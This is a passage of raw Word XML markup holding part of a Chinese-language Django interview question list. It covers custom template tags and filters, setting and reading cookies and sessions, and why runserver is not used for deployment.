          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>的类视图的</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD211D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>dispatch</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD211D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>方法实现控制：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71D4BC92" w14:textId="4742AC16" w:rsidR="006B2B80" w:rsidRPr="002111E5" w:rsidRDefault="00AD211D" w:rsidP="002111E5">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44" w:name="t52"/>
      <w:bookmarkEnd w:id="44"/>
      <w:r w:rsidRPr="002111E5">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>05</w:t>
      </w:r>
      <w:r w:rsidR="002111E5">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>7</w:t>
      </w:r>
      <w:r w:rsidRPr="002111E5">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描述下</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="002111E5">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="002111E5">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>自定义</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="002111E5">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>simple_tag</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="002111E5">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09531DA9"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xml:space="preserve"># </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD211D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>自定义</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD211D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>filter</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 xml:space="preserve">{{ </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD211D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>参数</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD211D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>1|filter</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD211D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>函数名</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参数</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD211D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>2 }}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54A5902B"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1.</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD211D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>可以与</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD211D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>if</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD211D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>标签来连用</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E98AF2A"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2.</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD211D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>自定义时需要写两个形参</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7284CD86"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simple_tag:{% simple_tag</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD211D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>函数名</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD211D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD211D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>参数</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD211D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">1 </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD211D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>参数</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD211D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>2 %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BCD83D7"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1.</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD211D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>可以传多个参数</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD211D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD211D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>没有限制</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4647BA2E" w14:textId="77777777"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color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t># 2.</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD211D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>不能与</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD211D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>if</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD211D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>标签来连用</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="302D8A36" w14:textId="77777777" w:rsidR="00D8288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hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>@register.simple_tag</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="718E75F0" w14:textId="77777777" w:rsidR="00D8288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hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">def </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD211D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>multi_tag(x,y):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48BE3FEA" w14:textId="5E1BF4E2" w:rsidR="006B2B80" w:rsidRPr="00AD211D" w:rsidRDefault="006B2B80" w:rsidP="00AD211D">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D211D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">return </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD211D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>x*y</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45A6DF9B" w14:textId="4D88B5A5" w:rsidR="006B2B80" w:rsidRPr="002111E5" w:rsidRDefault="002111E5" w:rsidP="002111E5">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45" w:name="t53"/>
      <w:bookmarkEnd w:id="45"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="002111E5">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>5</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>8</w:t>
      </w:r>
      <w:r>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什么是</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="002111E5">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Cookie</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="002111E5">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>、如何获取、设置</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="002111E5">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Cookie</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="002111E5">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DDD10DB"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lastRenderedPageBreak/>
        <w:t>会话跟踪技术，保留用户</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14DC6958"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Cookie是由服务器创建，然?后通过响应发送给客户端?的一个键值对。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66C208E4"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具体一个浏览器针对一个服务器存储的key-value({ })</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CDC0E4F"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response.set_cookie("is_login",</w:t>
      </w:r>
      <w:r w:rsidRPr="00F532EB">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>True</w:t>
      </w:r>
      <w:r w:rsidRPr="00F532EB">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>) </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="611DD3B9"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request.COOKIES.get("is_login")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5050570B" w14:textId="187477A1" w:rsidR="006B2B80" w:rsidRDefault="002111E5" w:rsidP="002111E5">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:wordWrap w:val="0"/>
        <w:spacing w:line="340" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="2"/>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial"/>
          <w:color w:val="4F4F4F"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="46" w:name="t54"/>
      <w:bookmarkEnd w:id="46"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>059</w:t>
      </w:r>
      <w:r>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什么是</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="002111E5">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>session</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="002111E5">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>，与</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="002111E5">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>cookie</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="002111E5">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>的对比、设置、获取、清空</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="002111E5">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>session</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="002111E5">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35281DFC"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Session是服务器端技术，利用这个技术，服务器在运行时可以 为每一个用户的浏览器创建一个其独享的session对象，由于 session为用户浏览器独享，所以用户在访问服务器的web资源时 ，可以把各自的数据放在各自的session中，当用户再去访问该服务器中的其它web资源时，其它web资源再从用户各自的session中 取出数据为用户服务。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F130FFB"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 request.session["is_login"] = True</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7958FC4D"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 is_login = request.session.get("is_login")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65D41A4B"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 request.session.flush()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30D56E61" w14:textId="76558F7B" w:rsidR="006B2B80" w:rsidRPr="002111E5" w:rsidRDefault="00AD211D" w:rsidP="002111E5">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="300" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002111E5">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>06</w:t>
      </w:r>
      <w:r w:rsidR="002111E5">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>8</w:t>
      </w:r>
      <w:r w:rsidRPr="002111E5">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Django</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="002111E5">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> 本身提供了 </w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="002111E5">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>runserver</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="002111E5">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>，为什么不能用来部署？ </w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="002111E5">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06F84B85"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hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>    runserver 方法是调试 Django 时经常用到的运行方式，它使用 Django 自带的  WSGI</w:t>
      </w:r>
      <w:r w:rsidRPr="00F532EB">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F532EB">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Server 运行，主要在测试和开发中使用，并且 runserver 开启的方式也是单进程 。  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E75DD58"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hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>   </w:t>
      </w:r>
      <w:r w:rsidRPr="00F532EB">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F532EB">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>uWSGI 是一个 Web 服务器，它实现了 WSGI 协议、uwsgi、http 等协议。注意 uwsgi 是一种通信协议，而 uWSGI 是实现 uwsgi 协议和 WSGI 协议的 Web 服务器。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AB9635F"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hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>    uWSGI 具有超快的性能、低内存占用和多 app 管理等优点，并且搭配着</w:t>
      </w:r>
      <w:r w:rsidRPr="00F532EB">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F532EB">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Nginx</w:t>
      </w:r>
      <w:r w:rsidRPr="00F532EB">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F532EB">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
